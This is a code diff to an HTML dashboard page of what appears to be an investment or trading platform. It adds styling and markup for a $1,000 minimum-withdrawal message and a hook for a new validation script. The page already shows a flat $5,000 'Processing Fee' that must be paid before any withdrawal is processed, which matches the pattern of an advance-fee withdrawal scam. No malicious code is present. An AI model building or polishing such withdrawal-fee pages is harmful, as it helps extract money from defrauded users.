@@ -9,6 +9,46 @@
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet" />
+  <style>
+    /* ========== Minimum Withdrawal Validation Styles ========== */
+    
+    /* Validation message container - hidden by default */
+    #wd-amount-validation {
+      padding: 0.75rem 1rem;
+      border-radius: var(--radius-md, 8px);
+      font-size: 0.9rem;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 0.5rem;
+    }
+    
+    /* Error state for minimum withdrawal not met */
+    #wd-amount-validation.error {
+      background: #fee2e2;
+      color: #991b1b;
+      border: 1px solid #fca5a5;
+    }
+    
+    /* Error icon styling */
+    #wd-amount-validation i {
+      flex-shrink: 0;
+      font-size: 1.1rem;
+    }
+    
+    /* Helper text below the input */
+    .wd-amount-helper {
+      font-size: 0.85rem;
+      color: var(--text-secondary, #6b7280);
+      margin-top: 0.35rem;
+      display: none;
+    }
+    
+    .wd-amount-helper.active {
+      display: block;
+    }
+  </style>
 </head>
 <body class="dashboard-body">
 
@@ -106,9 +146,14 @@
               <div class="input-wrap"><i class="fas fa-dollar-sign"></i>
                 <input type="number" id="wd-amount" class="form-input" placeholder="0.00" min="1" step="0.01" required />
               </div>
+              <!-- CHANGED: Dynamic validation message - hidden by default, appears when minimum not met -->
+              <div id="wd-amount-validation" hidden>
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="wd-validation-text">Minimum withdrawal: $1,000</span>
+              </div>
             </div>
             <div id="wd-bank-error" class="form-error" hidden></div>
-            <button type="submit" class="btn btn-primary btn-lg btn-full"><span>Continue to Fee Payment</span><i class="fas fa-arrow-right"></i></button>
+            <button type="submit" class="btn btn-primary btn-lg btn-full" id="wd-submit-btn"><span>Continue to Fee Payment</span><i class="fas fa-arrow-right"></i></button>
           </form>
         </div>
       </div>
@@ -124,7 +169,7 @@
           <div class="wd-fee-icon"><i class="fas fa-exclamation-triangle"></i></div>
           <div class="wd-fee-info">
             <h3>Processing Fee: <span class="wd-fee-amount">$5,000.00</span></h3>
-            <p>This fee covers international wire transfer, compliance verification, and insurance. It must be paid before your withdrawal of <strong id="wd-summary-amount">$0.00</strong> to <strong id="wd-summary-bank">Bank</strong> is processed.</p>
+            <p>This fee covers international wire transfer, compliance verification, and insurance. It must be paid before your withdrawal of <strong id="wd-summary-amount">$0.00</strong> to <str[...]
           </div>
         </div>
 
@@ -267,5 +312,7 @@
 
   <div class="dash-overlay" id="dash-overlay"></div>
   <script src="script.js?v=1779718836878"></script>
+  <!-- ADDED: New script for withdrawal validation logic -->
+  <script src="withdraw-validation.js"></script>
 </body>
 </html>
